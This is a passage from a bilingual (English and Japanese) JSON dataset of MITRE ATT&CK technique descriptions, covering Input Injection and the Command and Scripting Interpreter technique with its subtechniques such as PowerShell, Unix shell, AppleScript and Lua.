                "description_eng": "Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).\n\nFor example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap)\n\nAdversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.(Citation: BleepingComputer USB)",
                "description_jp": "攻撃者は、キーボードショートカットを使用してコマンドインタプリタを起動したり、インラインスクリプトを入力して実行したり、GUIベースのアプリケーションと直接対話したりするなど、ユーザーに代わってあらゆる種類のアクションを実行するために、さまざまな手段で被害者のコンピュータ上のキーストロークをシミュレートすることができます。  これらのアクションは、敵のツールにあらかじめプログラムされていたり、ヒューマン・インターフェース・デバイス（HID）などの物理的なデバイスを介して実行されたりします。\n\n例えば、敵対者は Windows のメッセージループを監視するツールを使って、ユーザが銀行固有の URL にアクセスしたことを検出しています。検出された場合、ツールは開発者コンソールを開くかアドレスバーを選択するキーストロークをシミュレートし、クリップボードから悪意のあるJavaScriptを貼り付けて実行する。\n\n攻撃者はまた、悪意のあるUSBデバイスを使用して、PowerShellを起動するキーストロークをエミュレートし、攻撃者が管理するサーバーからマルウェアをダウンロードして実行させることも行っている(引用：BleepingComputer USB)",
                "subtechniques": []
            },
            {
                "id": "T1059",
                "name_eng": "Command and Scripting Interpreter",
                "name_jp": "コマンドとスクリプトのインタープリター",
                "description_eng": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nThere are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
                "description_jp": "攻撃者は、コマンド、スクリプト、またはバイナリを実行するために、コマンドやスクリプトインタプリタを悪用する可能性があります。これらのインターフェイスや言語は、コンピュータシステムと対話する方法を提供し、多くの異なるプラットフォームで共通の機能です。例えば、macOSやLinuxディストリビューションには[Unix Shell](https://attack.mitre.org/techniques/T1059/004)があり、Windowsには[Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)や[PowerShell](https://attack.mitre.org/techniques/T1059/001)があります。\n\nまた、[JavaScript](https://attack.mitre.org/techniques/T1059/007)や[Visual Basic](https://attack.mitre.org/techniques/T1059/005)のようなクライアントアプリケーションによく使われるものと同様に、[Python](https://attack.mitre.org/techniques/T1059/006)のようなクロスプラットフォームのインタプリタもあります。\n\n攻撃者は、任意のコマンドを実行する手段として、様々な方法でこれらの技術を悪用するかもしれません。コマンドやスクリプトは、ルアー文書として被害者に配信される[Initial Access](https://attack.mitre.org/tactics/TA0001)ペイロードや、既存のC2からダウンロードされるセカンダリペイロードに埋め込むことができます。また、攻撃者は、対話型端末/シェルを通じてコマンドを実行したり、リモート実行を実現するためにさまざまな[リモートサービス](https://attack.mitre.org/techniques/T1021)を利用したりすることもあります。(引用: Powershell リモートコマンド)(引用: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)",
                "subtechniques": [
                    {
                        "id": "T1059.005",
                        "name_eng": "Visual Basic",
                        "name_jp": "ビジュアル・ベーシック",
                        "description_eng": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
                        "description_jp": "攻撃者は実行にVisual Basic (VB)を悪用するかもしれない。VBはマイクロソフトが開発したプログラミング言語で、Windows APIを通じて[Component Object Model](https://attack.mitre.org/techniques/T1559/001)や[Native API](https://attack.mitre.org/techniques/T1106)など多くのWindowsテクノロジーと相互運用性を持っている。将来的な進化は予定されておらずレガシーとされているが、VBは.NET Frameworkとクロスプラットフォームの.NET Coreに統合されサポートされている。(引用：VB .NET 2020年3月)(引用：VB Microsoft)\n\nまた、Visual Basic for Applications（VBA）やVBScriptなど、VBをベースにした派生言語も作られている。VBAは、Microsoft Officeやいくつかのサードパーティ製アプリケーションに組み込まれているイベント駆動型プログラミング言語である。(引用: Microsoft VBA)(引用: Wikipedia VBA) VBAは、ホスト上でタスクやその他の機能の実行を自動化するために使用されるマクロを文書に含めることを可能にする。VBScriptはWindowsホスト上のデフォルトのスクリプト言語であり、Internet Explorerに提供されるHTMLアプリケーション(HTA)ウェブページ上で[JavaScript](https://attack.mitre.org/techniques/T1059/007)の代わりに使用することもできる(ただし、最近のブラウザのほとんどはVBScriptをサポートしていない)。(引用: Microsoft VBScript)\n\n攻撃者は、悪意のあるコマンドを実行するために VB ペイロードを使用する可能性があります。一般的な悪意のある使用方法には、VBScript を使用した動作の自動実行や、[Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) ペイロードへの VBA コンテンツの埋め込み (実行を可能にするために [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) を使用する場合もあります) があります。(引用: デフォルト VBS マクロのブロック)"
                    },
                    {
                        "id": "T1059.002",
                        "name_eng": "AppleScript",
                        "name_jp": "アップルスクリプト",
                        "description_eng": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)",
                        "description_jp": "攻撃者はAppleScriptを悪用して実行する可能性がある。AppleScriptはmacOSのスクリプト言語で、AppleEventと呼ばれるアプリケーション間のメッセージを介してアプリケーションやOSの一部を制御するように設計されています（引用：Apple AppleScript） これらのAppleEventメッセージは単独で送信することも、AppleScriptで簡単にスクリプト化することもできます。これらのイベントは、開いているウィンドウの位置を特定したり、キー入力を送信したり、ローカルまたはリモートで開いているほとんどすべてのアプリケーションと対話したりすることができます。\n\nスクリプトはコマンドラインから <code>osascript /path/to/script</code> または <code>osascript -e \"script here\"</code> で実行できます。コマンドライン以外にも、メールルール、Calendar.appアラーム、Automatorワークフローなど、さまざまな方法でスクリプトを実行できます。AppleScriptsは、スクリプトファイルの先頭に<code>#!/usr/bin/osascript</code>を追加することで、プレーンテキストのシェルスクリプトとして実行することもできます(引用: SentinelOne AppleScript)\n\nアップルスクリプトは、実行するために<code>osascript</code>を呼び出す必要はありません。しかし、macOS [Native API](https://attack.mitre.org/techniques/T1106) の <code>NSAppleScript</code> または <code>OSAScript</code> を使用することで、mach-O バイナリ内から実行することができます。\n\n攻撃者はアップルスクリプトを悪用して、開いているSSH接続とやりとりしたり、リモートマシンに移動したり、さらにはユーザに偽のダイアログボックスを表示したりするなど、さまざまな動作を実行する可能性があります。これらのイベントはリモートでアプリケーションを起動することはできませんが（ローカルで起動することはできます）、すでにリモートで実行されているアプリケーションと対話することはできます。macOS 10.10 Yosemite以降では、AppleScriptは[Native API](https://attack.mitre.org/techniques/T1106)を実行する機能を備えている。そうでなければ、コンパイルしてmach-Oバイナリファイル形式で実行する必要がある。(引用：SentinelOne macOS Red Team) これはスクリプト言語であるため、[Python](https://attack.mitre.org/techniques/T1059/006)を介したリバースシェルなど、より一般的なテクニックを起動するためにも使用できる。(引用：Macを狙うマクロマルウェア)"
                    },
                    {
                        "id": "T1059.003",
                        "name_eng": "Windows Command Shell",
                        "name_jp": "Windowsコマンドシェル",
                        "description_eng": "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.",
                        "description_jp": "攻撃者はWindowsコマンドシェルを悪用して実行する可能性がある。Windowsコマンドシェル([cmd](https://attack.mitre.org/software/S0106))はWindowsシステム上の主要なコマンドプロンプトである。Windowsコマンドプロンプトは、システムのほとんどすべての側面を制御するために使用することができ、コマンドの異なるサブセットに必要な様々な権限レベルを持つ。コマンドプロンプトは、[SSH](https://attack.mitre.org/techniques/T1021/004)のような[リモートサービス](https://attack.mitre.org/techniques/T1021)を介してリモートから呼び出すことができる。(引用: WindowsにおけるSSH)\n\nバッチファイル（例：.batまたは.cmd）は、条件分岐やループなどの通常のスクリプト操作と同様に、実行する連続コマンドのリストをシェルに提供します。バッチファイルの一般的な用途には、長いタスクや繰り返しタスク、複数のシステムで同じコマンドセットを実行する必要がある場合などがあります。\n\n攻撃者は、[cmd](https://attack.mitre.org/software/S0106) を利用して、さまざまなコマンドやペイロードを実行する可能性がある。一般的な使用方法としては、[cmd](https://attack.mitre.org/software/S0106) を使用して単一のコマンドを実行したり、[cmd](https://attack.mitre.org/software/S0106) をコマンドと制御チャネルを介して転送される入力と出力で対話的に悪用したりすることがある。"
                    },
                    {
                        "id": "T1059.004",
                        "name_eng": "Unix Shell",
                        "name_jp": "Unixシェル",
                        "description_eng": "Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.\n\nUnix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.\n\nSome systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.",
                        "description_jp": "攻撃者は、Unixシェルコマンドやスクリプトを悪用して実行する可能性があります。Unixシェルは、Linux、macOS、ESXiシステムの主要なコマンドプロンプトですが、特定のOSやディストリビューションに応じて、Unixシェルの多くのバリエーション（sh、ash、bash、zshなど）が存在します（引用：DieNet Bash）（引用：Apple ZShell）Unixシェルは、システムのあらゆる側面を制御することができ、特定のコマンドは昇格特権を必要とします。\n\nUnixシェルはまた、条件分岐やループなどの他の典型的なプログラミング操作と同様に、コマンドの連続実行を可能にするスクリプトをサポートしています。シェルスクリプトの一般的な用途としては、長いタスクや繰り返しタスク、複数のシステムで同じコマンドを実行する必要がある場合などがあります。\n\n攻撃者はUnixシェルを悪用して、さまざまなコマンドやペイロードを実行する可能性があります。対話型シェルは、コマンド＆コントロールチャネルを通じて、または[SSH](https://attack.mitre.org/techniques/T1021/004)を使用した横移動中にアクセスされることがあります。また、攻撃者はシェルスクリプトを利用して、被害者に複数のコマンドを配信・実行したり、永続化のために使用されるペイロードの一部として使用したりすることもあります。\n\n組み込みデバイス、軽量Linuxディストリビューション、ESXiサーバなど、一部のシステムでは、シンプルなシェルを含むさまざまなツールを含む小さな実行ファイルであるBusyboxを介して、ストリップダウンされたUnixシェルを活用することがあります。"
                    },
                    {
                        "id": "T1059.010",
                        "name_eng": "AutoHotKey & AutoIT",
                        "name_jp": "AutoHotKey & AutoIT",
                        "description_eng": "Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)\n\nAdversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)\n\nThese scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)",
                        "description_jp": "攻撃者は、AutoITおよびAutoHotKey自動化スクリプトを使用してコマンドを実行し、悪意のあるタスクを実行する可能性があります。AutoITおよびAutoHotkey（AHK）は、ユーザーがWindowsタスクを自動化できるようにするスクリプト言語です。これらの自動化スクリプトは、ボタンのクリック、テキストの入力、プログラムの開閉など、さまざまなアクションを実行するために使用できます。 引用：AutoIT）（引用：AutoHotKey\n\n攻撃者は、AHK（`.ahk`）スクリプトやAutoIT（`.au3`）スクリプトを使用して、被害者のシステム上で悪意のあるコードを実行することがあります。たとえば、攻撃者はAHKを使用して、ペイロードやキーロガーなどのモジュール型マルウェアを実行しています。また、マルウェアを埋め込んだカスタムAHKファイルを[フィッシング](https://attack.mitre.org/techniques/T1566)ペイロードとして使用するケースもあります(引用: Splunk DarkGate)。\n\nこれらのスクリプトは、自己完結型の実行可能ペイロード(`.exe`)にコンパイルされることもあります(引用：AutoIT)(引用：AutoHotKey)"
                    },
                    {
                        "id": "T1059.008",
                        "name_eng": "Network Device CLI",
                        "name_jp": "ネットワークデバイスCLI",
                        "description_eng": "Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. \n\nScripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).\n\nAdversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)",
                        "description_jp": "攻撃者は、悪意のあるコマンドやペイロードを実行するために、ネットワークデバイス上のスクリプトやビルトインコマンドラインインタプリタ（CLI）を悪用する可能性があります。CLI は、ユーザや管理者がシステム情報を見たり、デバイスの操作を変更したり、診断や管理機能を実行したりするために、デバイスとやりとりする主要な手段です。CLI には通常、コマンドごとに必要な様々な権限レベルが含まれています。\n\nスクリプト・インタープリタは、タスクを自動化し、ネットワークOSに含まれるコマンド・セットを超えて機能を拡張します。CLIとスクリプト・インタープリタには、コンソールに直接接続するか、telnetや[SSH](https://attack.mitre.org/techniques/T1021/004)などのリモート手段でアクセスできます。\n\n攻撃者はネットワークCLIを使用して、ネットワークデバイスの動作や操作方法を変更することができます。CLI を使用して、トラフィックフローを操作してデータを傍受または操作したり、スタートアップ設定パラメータを変更して悪意のあるシステムソフトウェアをロードしたり、セキュリティ機能やロギングを無効にして検知を回避したりすることができる。 引用：Cisco Synful Knock Evolution"
                    },
                    {
                        "id": "T1059.012",
                        "name_eng": "Hypervisor CLI",
                        "name_jp": "ハイパーバイザーCLI",
                        "description_eng": "Adversaries may abuse hypervisor command line interpreters (CLIs) to execute malicious commands. Hypervisor CLIs typically enable a wide variety of functionality for managing both the hypervisor itself and the guest virtual machines it hosts. \n\nFor example, on ESXi systems, tools such as `esxcli` and `vim-cmd` allow administrators to configure firewall rules and log forwarding on the hypervisor, list virtual machines, start and stop virtual machines, and more.(Citation: Broadcom ESXCLI Reference)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: LOLESXi) Adversaries may be able to leverage these tools in order to support further actions, such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).",
                        "description_jp": "攻撃者は、ハイパーバイザーのコマンドラインインタプリタ（CLI）を悪用して悪意のあるコマンドを実行する可能性があります。ハイパーバイザーのCLIは通常、ハイパーバイザー自身と、ハイパーバイザーがホストするゲスト仮想マシンの両方を管理するための多様な機能を可能にします。\n\n例えば、ESXi システムでは、`esxcli` や `vim-cmd` などのツールにより、管理者はハイパーバイザー上のファイアウォールルールやログ転送の設定、仮想マシンの一覧表示、仮想マシンの起動と停止などを行うことができます。(引用: Broadcom ESXCLI Reference)(引用: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(引用: LOLESXi) 攻撃者は、[File and Directory Discovery](https://attack.mitre.org/techniques/T1083) や [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) などのさらなるアクションをサポートするために、これらのツールを活用することができます。"
                    },
                    {
                        "id": "T1059.006",
                        "name_eng": "Python",
                        "name_jp": "Python",
                        "description_eng": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.",
                        "description_jp": "攻撃者はPythonコマンドやスクリプトを悪用して実行する可能性があります。Pythonは非常に人気のあるスクリプト/プログラミング言語で、多くの機能を実行することができます。Pythonは、コマンドラインから（<code>python.exe</code>インタプリタを介して）対話的に実行することも、スクリプト（.py）を書いて異なるシステムに配布することもできます。Pythonコードはバイナリの実行ファイルにコンパイルすることもできる。(引用：Zscaler APT31 Covid-19 October 2020)\n\nPythonには、ファイル操作やデバイスI/Oなど、基盤となるシステムとやり取りするための多くの組み込みパッケージが付属しています。攻撃者は、これらのライブラリを使用して、コマンドやその他のスクリプトをダウンロードして実行したり、さまざまな悪意のある動作を実行したりすることができます。"
                    },
                    {
                        "id": "T1059.001",
                        "name_eng": "PowerShell",
                        "name_jp": "PowerShell",
                        "description_eng": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
                        "description_jp": "攻撃者は、PowerShell コマンドやスクリプトを悪用して実行する可能性があります。PowerShellは、Windowsオペレーティングシステムに含まれる強力な対話型コマンドラインインターフェイスとスクリプト環境です（引用：TechNet PowerShell）。例えば、実行可能ファイルを実行するために使用できる <code>Start-Process</code> コマンドレットや、ローカルまたはリモートコンピュータ上でコマンドを実行する <code>Invoke-Command</code> コマンドレットなどがあります (ただし、PowerShell を使用してリモートシステムに接続するには管理者権限が必要です)。\n\nPowerShellは、インターネットから実行ファイルをダウンロードして実行するためにも使用することができ、ディスクに触れることなくディスクやメモリから実行することができる。\n\nPowerShellベースの攻撃テストツールには、[Empire](https://attack.mitre.org/software/S0363)、[PowerSploit](https://attack.mitre.org/software/S0194)、[PoshC2](https://attack.mitre.org/software/S0378)、PSAttackなどがある。(引用：Github PSAttack)\n\nPowerShellコマンド/スクリプトは、.NETフレームワークとWindows共通言語インタフェース(CLI)を通じて公開されるPowerShellの基礎となる<code>System.Management.Automation</code>アセンブリDLLへのインタフェースを通じて、<code>powershell.exe</code>バイナリを直接呼び出さずに実行することもできます(引用: Sixdub PowerPick 2016年1月)(引用: SilentBreak Offensive PS 2015年12月)(引用: Microsoft PSfromCsharp APR 2014年)"
                    },
                    {
                        "id": "T1059.009",
                        "name_eng": "Cloud API",
                        "name_jp": "Cloud API",
                        "description_eng": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.",
                        "description_jp": "攻撃者はクラウドAPIを悪用して悪意のあるコマンドを実行する可能性がある。クラウド環境で利用可能なAPIは様々な機能を提供し、テナントのほぼすべての側面にプログラムでアクセスするための機能豊富な方法です。これらのAPIは、コマンドラインインタープリタ（CLI）、ブラウザ内のクラウドシェル、Azure for PowerShell（引用：Microsoft - Azure PowerShell）のような[PowerShell](https://attack.mitre.org/techniques/T1059/001)モジュール、または[Python](https://attack.mitre.org/techniques/T1059/006)のような言語で利用可能なソフトウェア開発者キット（SDK）のような様々な方法を通じて利用することができる。  \n\nクラウドAPIの機能により、コンピュート、ストレージ、アイデンティティとアクセス管理（IAM）、ネットワーク、セキュリティポリシーなど、テナント内の主要なサービスすべてにまたがる管理アクセスを可能にすることができる。\n\n適切なパーミッション（多くの場合、[Application Access Token](https://attack.mitre.org/techniques/T1550/001)や[Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)のようなクレデンシャルを使用することで、敵対者はクラウドAPIを悪用して、悪意のあるアクションを実行する様々な機能を呼び出すことができます。例えば、CLIやPowerShellの機能は、クラウドホストやオンプレミスのホストにインストールされたバイナリからアクセスしたり、多くのクラウドプラットフォーム（AWS、Azure、GCPなど）が提供するブラウザベースのクラウドシェルからアクセスしたりすることができる。これらのクラウドシェルは、多くの場合、クラウド環境でコンテナとしてホストされているCLIやスクリプトモジュールを使用するためのパッケージ化された統合環境である。"
                    },
                    {
                        "id": "T1059.011",
                        "name_eng": "Lua",
                        "name_jp": "Lua",
                        "description_eng": "Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (<code>.lua</code>), or from Lua-embedded programs (through the <code>struct lua_State</code>).(Citation: Lua main page)(Citation: Lua state)\n\nLua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)",
                        "description_jp": "攻撃者は、Luaコマンドやスクリプトを悪用して実行する可能性があります。Luaは、主にアプリケーションに組み込んで使用するために設計された、クロスプラットフォームのスクリプトおよびプログラミング言語です。Lua は、コマンドライン (スタンドアロンの lua インタプリタを使用)、スクリプト (<code>.lua</code>) 、または Lua 組み込みプログラム (<code>struct lua_State</code> を使用) から実行できます。\n\nLuaスクリプトは、敵対者によって悪意のある目的で実行される可能性があります。敵対者は、既存の Lua インタプリタを組み込んだり、悪用したり、置き換えたりして、実行時に悪意のある Lua コマンドを実行できるようにする可能性がある(引用：PoetRat Lua)(引用：Lua Proofpoint Sunseed)(Citation：Cyphort EvilBunny)(Citation：Kaspersky Lua)"
                    },
                    {
                        "id": "T1059.007",
                        "name_eng": "JavaScript",
                        "name_jp": "JavaScript",
                        "description_eng": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
